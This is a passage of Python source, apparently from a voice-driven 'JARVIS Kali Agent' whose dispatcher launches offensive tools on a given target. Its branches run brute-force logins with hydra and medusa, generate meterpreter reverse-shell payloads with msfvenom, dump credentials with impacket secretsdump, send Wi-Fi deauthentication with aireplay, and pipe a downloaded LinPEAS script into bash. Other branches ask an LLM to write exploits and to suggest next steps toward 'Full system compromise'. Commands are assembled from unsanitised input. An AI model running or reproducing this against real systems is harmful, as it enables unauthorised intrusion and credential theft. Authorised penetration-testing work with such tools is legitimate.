        cmd = f"nuclei -u {target} -timeout 5 {options}"
        _speak(f"Nuclei on {target}, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return r["output"][:MAX_FINAL_OUTPUT]

    # ── HYDRA ────────────────────────────────────────────────────────────────
    elif action in ("hydra", "bruteforce"):
        if not target or not service:
            return "❌ Provide target and service."
        installer.ensure_tool("hydra")
        u_flag = f"-l {username}" if username else "-L /usr/share/wordlists/metasploit/unix_users.txt"
        p_flag = f"-p '{password}'" if password else f"-P '{wordlist}'"
        cmd    = f"hydra {u_flag} {p_flag} {target} {service} -t 4 {options}"
        _speak(f"Hydra on {target}, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"brute force {target}")

    # ── HASHCAT ──────────────────────────────────────────────────────────────
    elif action in ("hashcat", "crack_hash"):
        if not hash_val and not hash_file:
            return "❌ Provide hash or hash_file."
        installer.ensure_tool("hashcat")
        h_target = f"'{hash_val}'" if hash_val else f"'{hash_file}'"
        wlist    = wordlist if Path(wordlist).exists() else "/usr/share/wordlists/rockyou.txt"
        cmd      = f"hashcat -m {hash_mode} {h_target} '{wlist}' --force {options}"
        _speak("Hashcat, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], "hash cracking")

    # ── JOHN ─────────────────────────────────────────────────────────────────
    elif action in ("john", "john_the_ripper"):
        hf = hash_file or command
        if not hf:
            return "❌ Provide hash file path."
        installer.ensure_tool("john")
        wflag = f"--wordlist='{wordlist}'" if Path(wordlist).exists() else ""
        cmd   = f"john '{hf}' {wflag} {options}"
        _speak("John the Ripper, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], "john cracking")

    # ── MEDUSA ────────────────────────────────────────────────────────────────
    elif action == "medusa":
        if not target or not service:
            return "❌ Provide target and service."
        installer.ensure_tool("medusa")
        u_flag = f"-u {username}" if username else "-U /usr/share/wordlists/metasploit/unix_users.txt"
        p_flag = f"-p '{password}'" if password else f"-P '{wordlist}'"
        cmd    = f"medusa -h {target} {u_flag} {p_flag} -M {service} {options}"
        _speak(f"Medusa on {target}, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"medusa {target}")

    # ── MSFVENOM ─────────────────────────────────────────────────────────────
    elif action in ("msfvenom", "generate_payload"):
        if not payload:
            payload = "linux/x86/meterpreter/reverse_tcp"
        if not lhost:
            r_ip  = executor.run_command("hostname -I | awk '{print $1}'", timeout=5)
            lhost = r_ip["output"].strip() or "127.0.0.1"
        installer.ensure_tool("msfvenom")
        safe_out = output or str(WORKSPACE / f"payload_{int(time.time())}.{format_}")
        cmd = (
            f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
            f"-f {format_} -o '{safe_out}' {options}"
        )
        _speak("Generating payload, sir.")
        r = executor.run_command(cmd, timeout=60)
        return f"[MSFVENOM]\n{r['output'][:500]}\nOutput: {safe_out}"

    # ── METASPLOIT ────────────────────────────────────────────────────────────
    elif action in ("metasploit", "msf", "msfconsole"):
        installer.ensure_tool("metasploit")
        msf_cmds = command or task
        if not msf_cmds:
            r = executor.run_in_terminal("msfconsole")
            return r.get("output", "Metasploit opened.")
        rc_file = WORKSPACE / f"msf_{int(time.time())}.rc"
        with open(rc_file, "w") as f:
            f.write(msf_cmds.replace("\\n", "\n") + "\nexit\n")
        _speak("Running Metasploit script, sir.")
        r = executor.run_command(f"msfconsole -q -r '{rc_file}'", timeout=timeout)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], "metasploit")

    # ── SEARCHSPLOIT ──────────────────────────────────────────────────────────
    elif action in ("searchsploit", "find_exploit"):
        query = task or command or options
        if not query:
            return "❌ Provide search query."
        installer.ensure_tool("searchsploit")
        r = executor.run_command(f"searchsploit {query}", timeout=30)
        return r["output"][:MAX_FINAL_OUTPUT]

    # ── LINPEAS ───────────────────────────────────────────────────────────────
    elif action in ("linpeas", "privesc"):
        linpeas = TOOLS_DIR / "PEASS-ng" / "linPEAS" / "linpeas.sh"
        if not linpeas.exists():
            _speak("Downloading LinPEAS, sir.")
            repo_mgr.clone("https://github.com/carlospolop/PEASS-ng", name="PEASS-ng")
        cmd = f"bash '{linpeas}' 2>&1" if linpeas.exists() else \
              "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>&1"
        _speak("Running LinPEAS, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], "privesc check")

    # ── AIRMON ────────────────────────────────────────────────────────────────
    elif action in ("airmon", "monitor_mode"):
        installer.ensure_tool("airmon-ng")
        r = executor.run_command(f"sudo airmon-ng start {interface or 'wlan0'}", timeout=20, sudo=True)
        return r["output"]

    # ── AIRODUMP ─────────────────────────────────────────────────────────────
    elif action == "airodump":
        installer.ensure_tool("airodump-ng")
        iface  = interface or "wlan0mon"
        bssid  = parameters.get("bssid", "")
        ch     = parameters.get("channel", "")
        w_flag = f"-w '{output}'" if output else ""
        b_flag = f"--bssid {bssid}" if bssid else ""
        c_flag = f"-c {ch}" if ch else ""
        cmd    = f"sudo airodump-ng {b_flag} {c_flag} {w_flag} {iface} {options}"
        r      = executor.run_in_terminal(cmd)
        return r.get("output", "Airodump started.")

    # ── AIRCRACK ─────────────────────────────────────────────────────────────
    elif action in ("aircrack", "wifi_crack"):
        if not cap_file:
            return "❌ Provide cap_file path."
        installer.ensure_tool("aircrack-ng")
        wlist = wordlist if Path(wordlist).exists() else "/usr/share/wordlists/rockyou.txt"
        cmd   = f"aircrack-ng -w '{wlist}' '{cap_file}' {options}"
        _speak("Aircrack-ng, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], "WiFi cracking")

    # ── AIREPLAY ─────────────────────────────────────────────────────────────
    elif action == "aireplay":
        installer.ensure_tool("aireplay-ng")
        iface  = interface or "wlan0mon"
        bssid  = parameters.get("bssid", "")
        client = parameters.get("client", "FF:FF:FF:FF:FF:FF")
        count  = parameters.get("count", 5)
        b_flag = f"-a {bssid}" if bssid else ""
        cmd    = f"sudo aireplay-ng --deauth {count} {b_flag} -c {client} {iface} {options}"
        r      = executor.run_command(cmd, timeout=20, sudo=True)
        return r["output"]

    # ── RESPONDER ────────────────────────────────────────────────────────────
    elif action in ("responder", "llmnr"):
        installer.ensure_tool("responder")
        r = executor.run_in_terminal(f"sudo responder -I {interface} -rdwv {options}")
        return r.get("output", "Responder started.")

    # ── BETTERCAP ────────────────────────────────────────────────────────────
    elif action == "bettercap":
        installer.ensure_tool("bettercap")
        r = executor.run_in_terminal(f"sudo bettercap -iface {interface} {options}")
        return r.get("output", "Bettercap started.")

    # ── TCPDUMP ──────────────────────────────────────────────────────────────
    elif action in ("tcpdump", "capture", "sniff"):
        installer.ensure_tool("tcpdump")
        out_flag = f"-w '{output}'" if output else ""
        r = executor.run_in_terminal(f"sudo tcpdump -i {interface} {out_flag} {options}")
        return r.get("output", "TCPDump started.")

    # ── THEHARVESTER ─────────────────────────────────────────────────────────
    elif action in ("theharvester", "harvester", "osint"):
        if not domain:
            return "❌ Provide domain."
        installer.ensure_tool("theharvester")
        sources = options or "google,bing,duckduckgo"
        cmd     = f"theHarvester -d {domain} -b {sources} -l 50 2>&1"
        _speak(f"Harvesting OSINT on {domain}, sir.")
        r = _run_step(cmd, 20)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"OSINT {domain}")

    # ── AMASS ────────────────────────────────────────────────────────────────
    elif action in ("amass", "subdomain_enum"):
        if not domain:
            return "❌ Provide domain."
        installer.ensure_tool("amass")
        cmd = f"amass enum -d {domain} -timeout 1 {options}"
        _speak(f"Amass on {domain}, sir.")
        r = _run_step(cmd, 20, force_bg=True)
        return f"Amass running in background for {domain}.\n{r['output'][:500]}"

    # ── SUBFINDER ────────────────────────────────────────────────────────────
    elif action == "subfinder":
        if not domain:
            return "❌ Provide domain."
        if not installer.is_installed("subfinder"):
            repo_mgr.clone("https://github.com/projectdiscovery/subfinder")
        cmd = f"subfinder -d {domain} -timeout 10 {options}"
        _speak(f"Subfinder on {domain}, sir.")
        r = _run_step(cmd, 20)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"subdomains {domain}")

    # ── ENUM4LINUX ────────────────────────────────────────────────────────────
    elif action in ("enum4linux", "smb_enum"):
        if not target:
            return "❌ Provide target IP."
        installer.ensure_tool("enum4linux")
        r = _run_step(f"enum4linux -a {target} {options}", 30)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"SMB enum {target}")

    # ── CRACKMAPEXEC ─────────────────────────────────────────────────────────
    elif action in ("crackmapexec", "cme"):
        if not target:
            return "❌ Provide target."
        installer.ensure_tool("crackmapexec")
        proto  = service or "smb"
        u_flag = f"-u {username}" if username else ""
        p_flag = f"-p '{password}'" if password else ""
        r      = _run_step(f"crackmapexec {proto} {target} {u_flag} {p_flag} {options}", 30)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"cme {target}")

    # ── IMPACKET ─────────────────────────────────────────────────────────────
    elif action in ("impacket", "secretsdump", "psexec"):
        installer.ensure_tool("impacket")
        if "secret" in action:
            cmd = f"impacket-secretsdump {username}:{password}@{target} {options}"
        elif "psexec" in action:
            cmd = f"impacket-psexec {username}:{password}@{target} {options}"
        else:
            cmd = command or f"impacket-{action} {options}"
        r = _run_step(cmd, 30)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"impacket {action}")

    # ── BLOODHOUND ────────────────────────────────────────────────────────────
    elif action in ("bloodhound", "ad_enum"):
        installer.ensure_tool("bloodhound")
        if "collect" in (task or command or "").lower():
            cmd = f"bloodhound-python -d {domain} -u {username} -p '{password}' -c all {options}"
            r   = _run_step(cmd, 30, force_bg=True)
            return _finalize(r["output"][:MAX_FINAL_OUTPUT], "AD collection")
        r = executor.run_in_terminal("bloodhound")
        return r.get("output", "BloodHound opened.")

    # ── WPSCAN ───────────────────────────────────────────────────────────────
    elif action == "wpscan":
        if not target:
            return "❌ Provide target URL."
        installer.ensure_tool("wpscan")
        token  = parameters.get("token", "")
        t_flag = f"--api-token {token}" if token else ""
        cmd    = f"wpscan --url {target} {t_flag} --enumerate u,vp --max-scan-time 15 {options}"
        _speak(f"WPScan on {target}, sir.")
        r = _run_step(cmd, 20, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"wpscan {target}")

    # ── SETOOLKIT ────────────────────────────────────────────────────────────
    elif action in ("setoolkit", "set"):
        installer.ensure_tool("setoolkit")
        if command:
            rc_file = WORKSPACE / f"set_{int(time.time())}.rc"
            with open(rc_file, "w") as f:
                f.write(command + "\n")
            r = executor.run_command(f"setoolkit < '{rc_file}'", timeout=30)
            return r["output"][:MAX_FINAL_OUTPUT]
        return executor.run_in_terminal("setoolkit").get("output", "SET opened.")

    # ── WIRESHARK ────────────────────────────────────────────────────────────
    elif action == "wireshark":
        installer.ensure_tool("wireshark")
        executor.run_command("wireshark &", timeout=5, background=True)
        return "Wireshark opened, sir."

    # ── GHIDRA ───────────────────────────────────────────────────────────────
    elif action == "ghidra":
        installer.ensure_tool("ghidra")
        return executor.run_in_terminal("ghidra").get("output", "Ghidra opened.")

    # ── RADARE2 ──────────────────────────────────────────────────────────────
    elif action in ("radare2", "r2"):
        file_target = command or target
        if not file_target:
            return "❌ Provide file path."
        installer.ensure_tool("radare2")
        return executor.run_in_terminal(f"r2 '{file_target}'").get("output", f"r2 opened: {file_target}")

    # ── BINWALK ──────────────────────────────────────────────────────────────
    elif action == "binwalk":
        file_target = command or target
        if not file_target:
            return "❌ Provide file path."
        installer.ensure_tool("binwalk")
        r = executor.run_command(f"binwalk '{file_target}' {options}", timeout=30)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"binwalk {file_target}")

    # ── VOLATILITY ───────────────────────────────────────────────────────────
    elif action in ("volatility", "memory_analysis"):
        mem_file = command or target
        if not mem_file:
            return "❌ Provide memory dump file."
        installer.ensure_tool("volatility")
        p_flag = f"--profile={profile}" if profile else ""
        plugin = module or "imageinfo"
        r      = executor.run_command(f"vol -f '{mem_file}' {p_flag} {plugin} {options}", timeout=60)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], "memory forensics")

    # ── STRINGS ──────────────────────────────────────────────────────────────
    elif action == "strings":
        file_target = command or target
        if not file_target:
            return "❌ Provide file path."
        r = executor.run_command(f"strings '{file_target}' {options}", timeout=15)
        return r["output"][:MAX_FINAL_OUTPUT]

    # ── EXIFTOOL ─────────────────────────────────────────────────────────────
    elif action == "exiftool":
        file_target = command or target
        if not file_target:
            return "❌ Provide file path."
        installer.ensure_tool("exiftool")
        r = executor.run_command(f"exiftool '{file_target}' {options}", timeout=15)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"exiftool {file_target}")

    # ── STEGHIDE ─────────────────────────────────────────────────────────────
    elif action in ("steghide", "steganography"):
        installer.ensure_tool("steghide")
        file_target = command or target
        steg_action = "extract" if "extract" in (task or "").lower() else "info"
        p_flag      = f"-p '{password}'" if password else "-p ''"
        r = executor.run_command(
            f"steghide {steg_action} -sf '{file_target}' {p_flag} {options}",
            timeout=15,
        )
        return r["output"]

    # ── NETCAT ───────────────────────────────────────────────────────────────
    elif action in ("netcat", "nc", "listener"):
        installer.ensure_tool("netcat")
        if "listen" in (task or action or "").lower() or not target:
            cmd = f"nc -lvnp {port or lport}"
        else:
            cmd = f"nc {target} {port or 80} {options}"
        r = executor.run_in_terminal(cmd) if open_term else \
            executor.run_command(cmd, timeout=timeout, background=bg)
        return r.get("output", "Netcat started.")

    # ── SSH ───────────────────────────────────────────────────────────────────
    elif action == "ssh":
        if not target:
            return "❌ Provide target."
        u_flag = f"{username}@" if username else ""
        p_flag = f"-p {port}" if port else ""
        return executor.run_in_terminal(
            f"ssh {p_flag} {u_flag}{target} {options}"
        ).get("output", f"SSH to {target} opened.")

    # ── TOR ───────────────────────────────────────────────────────────────────
    elif action in ("tor", "start_tor", "anonymize"):
        installer.ensure_tool("tor")
        r        = executor.run_command("sudo service tor start 2>&1", timeout=20)
        ip_check = executor.run_command("curl -s https://check.torproject.org/api/ip", timeout=10)
        return f"{r['output']}\nTOR IP: {ip_check['output']}"

    elif action == "stop_tor":
        return executor.run_command("sudo service tor stop 2>&1", timeout=10)["output"]

    # ── PROXYCHAINS ───────────────────────────────────────────────────────────
    elif action == "proxychains":
        installer.ensure_tool("proxychains")
        cmd_to_proxy = command or task
        if not cmd_to_proxy:
            return "❌ Provide command to proxy."
        r = executor.run_command(f"proxychains4 {cmd_to_proxy}", timeout=timeout)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"proxychains: {cmd_to_proxy}")

    # ── MACCHANGER ───────────────────────────────────────────────────────────
    elif action == "macchanger":
        installer.ensure_tool("macchanger")
        mac    = parameters.get("mac", "")
        m_flag = f"-m {mac}" if mac else "-r"
        r      = executor.run_command(
            f"sudo macchanger {m_flag} {interface}", timeout=15, sudo=True
        )
        return r["output"]

    # ── FULL RECON ───────────────────────────────────────────────────────────
    elif action in ("full_recon", "recon"):
        if not target:
            return "❌ Provide target."
        _speak(f"Full recon on {target}, sir.")

        results = [f"{'='*40}\n🎯 RECON: {target}\n{'='*40}"]
        all_out = []

        recon_steps = [
            ("WHOIS",     f"whois {target} 2>&1",               10),
            ("DNS",       f"dig {target} ANY +short 2>&1",       8),
            ("NMAP",      f"nmap -T5 -F --open {target} 2>&1",  15),
            ("WHATWEB",   f"whatweb {target} 2>&1",              10),
        ]

        if not target[0].isdigit():
            recon_steps.insert(2, (
                "SUBDOMAINS",
                f"theHarvester -d {target} -b google -l 20 2>&1 | head -20",
                12,
            ))

        for step_name, step_cmd, step_to in recon_steps:
            _log(f"Recon: {step_name}")
            sr  = executor.run_command(step_cmd, timeout=step_to)
            out = sr["output"][:500]
            all_out.append(out)
            results.append(f"\n[{step_name}]\n{out}")

        if brain:
            analysis = brain.analyze_output("\n".join(all_out), f"Recon of {target}")
            results.append(f"\n[🔍 ANALYSIS]\n{analysis}")

        full_content = "\n".join(results)
        log_file     = _save_full_output(f"recon_{target}", target, full_content)

        if len(full_content) > MAX_FINAL_OUTPUT:
            return full_content[:MAX_FINAL_OUTPUT] + f"\n📁 Log: {log_file}"
        return full_content

    # ── USE TOOL ─────────────────────────────────────────────────────────────
    elif action in ("use_tool", "tool"):
        if not tool:
            return "❌ Specify tool name."
        if not installer.is_installed(tool):
            _speak(f"Installing {tool}, sir.")
            ok, out = installer.ensure_tool(tool)
            if not ok:
                return f"❌ Could not install {tool}: {out[:300]}"
        if not command and brain:
            command = brain.generate_custom_command(task or f"use {tool}", tool)
        if not command:
            command = f"{tool} {options} {target}"
        _speak(f"Running {tool}, sir.")
        r = executor.run_in_terminal(command) if open_term else _run_step(command, timeout)
        return _finalize(r.get("output", "")[:MAX_FINAL_OUTPUT], task or command)

    # ── OPEN TERMINAL ────────────────────────────────────────────────────────
    elif action in ("open_terminal", "terminal"):
        cmd_str = command or task or ""
        return executor.run_in_terminal(
            cmd_str, terminal=parameters.get("terminal_app")
        ).get("output", "Terminal opened.")

    # ── KILL PROCESS ─────────────────────────────────────────────────────────
    elif action in ("kill", "kill_process", "stop_process"):
        pid_str = proc_id or command
        if not pid_str:
            return "❌ Provide proc_id."
        return executor.kill_process(pid_str)

    # ── LIST PROCESSES ────────────────────────────────────────────────────────
    elif action in ("processes", "list_processes", "ps"):
        return executor.list_processes()

    # ── CHECK TOOL ────────────────────────────────────────────────────────────
    elif action in ("check", "check_tool", "which"):
        t = tool or command
        if not t:
            return "❌ Provide tool name."
        installed = installer.is_installed(t)
        path      = shutil.which(t) or "not in PATH"
        return f"{'✅' if installed else '❌'} {t}: {path}"

    # ── LIST TOOLS ───────────────────────────────────────────────────────────
    elif action in ("list_tools", "tools", "list"):
        lines = []
        for cat, tools_dict in KALI_TOOL_REGISTRY.items():
            if category and category.lower() not in cat.lower():
                continue
            lines.append(f"\n📂 {cat.upper()}")
            for tname, info in tools_dict.items():
                ok = "✅" if installer.is_installed(info["cmd"].split("+")[0]) else "⬜"
                lines.append(f"  {ok} {tname:<20} {info['desc']}")
        return "\n".join(lines)[:MAX_FINAL_OUTPUT] if lines else "No tools."

    # ── WORKSPACE ────────────────────────────────────────────────────────────
    elif action in ("workspace", "ls_workspace"):
        r = executor.run_command(f"ls -la '{WORKSPACE}'", timeout=5)
        return f"📁 {WORKSPACE}\n{r['output'][:500]}"

    # ── SEARCH GITHUB ─────────────────────────────────────────────────────────
    elif action in ("search_github", "github_search"):
        query = task or command or options
        if not query:
            return "❌ Provide search query."
        return repo_mgr.search_github(query)

    # ── SESSION SUMMARY ──────────────────────────────────────────────────────
    elif action in ("session", "summary"):
        return _session.summary()

    # ── GENERATE REPORT ───────────────────────────────────────────────────────
    elif action in ("report", "generate_report"):
        if not brain:
            return "❌ AI backend required."
        findings_text = task or command or _session.summary()
        _speak("Generating pentest report, sir.")
        return brain.generate_report(
            findings_text, target or _session.target or "Unspecified"
        )[:MAX_FINAL_OUTPUT]

    # ── EXPLAIN ───────────────────────────────────────────────────────────────
    elif action in ("explain", "how_to"):
        topic = task or command or tool
        if not topic:
            return "❌ Provide topic."
        if not brain:
            return "❌ AI backend required."
        return brain.explain(topic)[:MAX_FINAL_OUTPUT]

    # ── THINK / PLAN ──────────────────────────────────────────────────────────
    elif action in ("think", "plan"):
        t = task or command
        if not t:
            return "❌ Provide task."
        if not brain:
            return "❌ AI backend required."
        plan  = brain.think(t, context=f"Target: {target}" if target else "")
        lines = [
            f"[🧠 UNDERSTANDING]\n{plan.get('understanding','')}",
            f"\n[🔧 TOOLS]\n{', '.join(plan.get('tools_needed',[]) or ['None'])}",
            f"\n[⚠️  RISKS]\n{plan.get('risks','')}",
            "\n[📋 STEPS]",
        ]
        for s in plan.get("steps", []):
            lines.append(f"  {s.get('step','?')}. {s.get('description','')}")
            lines.append(f"     $ {s.get('command','')}")
        return "\n".join(lines)

    # ── GENERATE EXPLOIT ─────────────────────────────────────────────────────
    elif action in ("generate_exploit", "exploit"):
        vuln = task or command or parameters.get("vulnerability", "")
        if not vuln:
            return "❌ Provide vulnerability description."
        if not brain:
            return "❌ AI backend required."
        _speak("Generating exploit, sir.")
        return brain.generate_exploit(vuln, target)[:MAX_FINAL_OUTPUT]

    # ── ANALYZE OUTPUT ───────────────────────────────────────────────────────
    elif action in ("analyze", "analyse"):
        text = command or task or output
        if not text:
            return "❌ Provide text to analyze."
        if not brain:
            return "❌ AI backend required."
        return brain.analyze_output(text, context or "Security analysis")

    # ── NEXT STEPS ────────────────────────────────────────────────────────────
    elif action in ("next_steps", "suggest"):
        findings_text = task or command or _session.summary()
        objective     = context or target or "Full system compromise"
        if not brain:
            return "❌ AI backend required."
        return brain.suggest_next_steps(findings_text, objective)

    # ── EMAIL INTEGRATION ─────────────────────────────────────────────────────
    elif action in ("send_email", "email_report"):
        try:
            from actions.email_agent import email_agent
            body = parameters.get("body", "") or task or _session.summary()
            r    = email_agent(
                parameters={
                    "action":  "send",
                    "to":      parameters.get("to", ""),
                    "subject": parameters.get(
                        "subject",
                        f"JARVIS Kali Report — {datetime.now().strftime('%Y-%m-%d')}",
                    ),
                    "body": body,
                },
                player=player,
                speak=speak,
            )
            return r or "Email sent."
        except Exception as e:
            return f"❌ Email failed: {e}"

    # ── BROWSER ───────────────────────────────────────────────────────────────
    elif action in ("browse", "open_browser", "browser"):
        try:
            from actions.browser_control import browser_control
            nav_url = url or target
            if not nav_url:
                return "❌ Provide URL."
            r = browser_control(parameters={"action": "open", "url": nav_url}, player=player)
            return r or f"Browser opened: {nav_url}"
        except Exception as e:
            return f"❌ Browser failed: {e}"

    # ── STATUS ────────────────────────────────────────────────────────────────
    elif action in ("status", "info"):
        return "\n".join([
            "╔══════════════════════════════╗",
            "║  JARVIS Kali Agent v2.0      ║",
            "╚══════════════════════════════╝",
            f"Scripts:      {SCRIPTS_DIR}",
            f"Workspace:    {WORKSPACE}",
            f"Tools dir:    {TOOLS_DIR}",
            f"Logs:         {LOGS_DIR}",
            f"Session ID:   {_logger.session_id}",
            f"Groq Brain:   {'✅' if brain and brain.groq_client else '❌'}",
            f"Gemini Brain: {'✅' if brain and brain.gemini_client else '❌'}",
            f"Target:       {_session.target or 'Not set'}",
            f"Commands run: {len(_session.commands)}",
            f"Findings:     {len(_session.findings)}",
            "",
            executor.list_processes(),
        ])

    # ── FALLBACK ──────────────────────────────────────────────────────────────
    else:
        task_text = task or command or action
        if task_text:
            parameters["action"] = "auto"
            parameters["task"]   = task_text
            return kali_agent(parameters, player, speak)

        return (
            "❌ Unknown action. Try:\n"
            "  auto, run, install, script, clone, download\n"
            "  nmap, gobuster, sqlmap, nikto, hydra, hashcat\n"
            "  metasploit, msfvenom, linpeas, searchsploit\n"
            "  theharvester, amass, subfinder, full_recon\n"
            "  think, explain, analyze, generate_exploit\n"
            "  report, status, session, list_tools"
        )